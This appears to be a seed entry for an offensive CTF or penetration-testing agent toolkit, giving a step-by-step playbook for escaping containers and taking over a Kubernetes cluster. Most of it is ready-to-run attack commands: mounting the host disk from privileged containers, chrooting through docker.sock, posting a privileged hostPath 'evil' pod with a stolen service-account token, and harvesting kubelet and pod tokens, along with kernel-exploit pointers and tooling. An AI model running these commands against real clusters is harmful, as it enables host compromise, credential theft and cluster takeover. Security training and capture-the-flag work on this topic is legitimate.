# [Seed] Container escape → Obtain host root (cap_sys_admin / privileged container / docker.sock)

## Scene Classification
Penetration Testing / Cloud Native / Container Security

## Overview of Goals
Getting a shell inside a container (through application vulnerabilities / exposed Jenkins / or RCE on K8s) requires escaping from the container to the host, and then laterally controlling the entire K8s cluster.

## Complete Execution Chain

1. Check the location as soon as you enter the container
   ```bash
   id                                    # Is it root?
   cat /proc/self/status | grep CapEff   # View capabilities
   capsh --print                         # Same as above but more user-friendly
   ls -la /var/run/docker.sock           # Is the Docker socket down?
   mount | grep -v proc                  # See which host directories are mounted
   cat /proc/1/cgroup                    # Is it docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # service account / metadata token
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Choose an escape route based on the test results:

**Path A: Privileged Container (`--privileged`)**
   ```bash
   # Directly mount the host machine disk
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # Now you are the root of the host machine
   ```

**Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # Bypassing using release_agent (CVE-2022-0492 type)
   # Use cap_sys_admin to mount directly
   ```

**Path C: docker.sock is down**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

**Path D: K8s SA token has had permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # If you can create a pod → use hostPID/hostNetwork/hostPath to start a privileged pod escape
   ```

**Path E: kernel exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # Check kernel version
   # Choose an existing exploit for the corresponding CVE
   ```

3. After escaping, find the next hop on the host machine
   - kubelet credentials (/var/lib/kubelet)
   - container runtime socket (containerd / dockerd)
   - Tokens of other pods
   - hostNetwork → Directly connect to all service IPs in the cluster
4. Lateral diffusion across the entire K8s

## Pitfall Record

| Problem | Cause | Solution | Time Consumed |
|------|------|---------|------|
| The container is non-root, all capabilities are empty | Application layer hardening is good | Look for setuid binaries / kernel vulnerabilities / external container vulnerabilities | Several hours |
| Can see docker.sock but cannot read it | sock is root:root 660 | Current uid added to docker group (if there is a setgid program) or use another container | 30min |
| Created a privileged pod but the image failed to download | Internal network cluster, internal Docker registry | Use an existing image from the cluster (pick any under kube-system) | 20min |
| K8s SA token has no permissions | The default SA is usually default/restricted | Try listing pods → find a pod with cluster-admin → steal its SA token | 1h |
| No common tools after chroot | Host is a minimal distribution | Use chroot after mounting /proc /dev /sys; or operate /host directly in the original ns | 30min |
| The cluster has PodSecurity Standards | The restricted policy prohibits hostPath / privileged | Check if there are any namespace admission configurations that are lenient; find SAs with deployment creation permissions | Several hours |

## Toolchain Discovery

- **deepce** Container escape automated detection (a sh script, no dependencies)
- **kdigger** Kubernetes/container reconnaissance tool, outputs structured results
- **peirates** K8s Penetration Dedicated TUI
- **kube-hunter** Produced by Aqua, scans cluster security issues
- **botb (break out the box)** A long-standing container escape tool
- **cdk** Container Penetration Swiss Army Knife (Chinese project, covering scenarios of Chinese cloud providers)

## Key Code/Commands

One-click self-check:

```bash
# Pull deepce (without relying on anything)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: Detected N escape paths
```

Using K8s SA token to escape a privileged pod:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Check Permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If you can create a pod, use hostPath to mount the host
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Then exec into the evil pod, chroot /host
```

CVE-2022-0492 exploit (cap_sys_admin + without user namespace):

```bash
# See https://github.com/PaloAltoNetworks/cve-2022-0492
# Core: mount cgroup → write release_agent → trigger empty cgroup → execute in host context
```

## Suggestions for Improvement of This Package

- Already have `CTF-Sandbox-Orchestrator/competition-agent-cloud/`, it is recommended to add `references/k8s-attack-paths.md`
- attack-chain increase "Container Escape → Cluster Takeover" full path example
- bootstrap-manifest add deepce / kdigger / peirates

## Reusable patterns/script snippets

**Container Escape: 5 Quick Path Checks**:

```text
1. Privileged container           → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin     → CVE-2022-0492 (release_agent) / mount cgroup by yourself
3. docker.sock       → docker run -v /:/host alpine chroot /host
4. K8s SA + permissions → start hostPath/privileged pod
5. kernel CVE        → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must-watch after escaping**:

```text
- /var/lib/kubelet/pods/        → Steal SA token from other pods
- /var/lib/docker/              → View the list of running containers
- ip addr                        → Access the service IP directly using hostNetwork
- crictl ps                      → containerd container list
- ps -ef --forest                → Find kubelet / dockerd startup parameters (including token)
```

## Evolution Actions
- [ ] CTF-Sandbox-Orchestrator/competition-agent-cloud Add k8s-attack-paths.md
- [ ] attack-chain adds container escape → cluster takeover path
- [ ] bootstrap-manifest add deepce/kdigger/peirates

## Environmental Information
- Attack location: Inside the container (any shell entry point is acceptable)
- Requirements: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: Depends on the target, focusing on the CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 time window

## Desensitization Requirements
This entry is seed data, compiled based on public container/K8s security research, and does not involve any real clusters.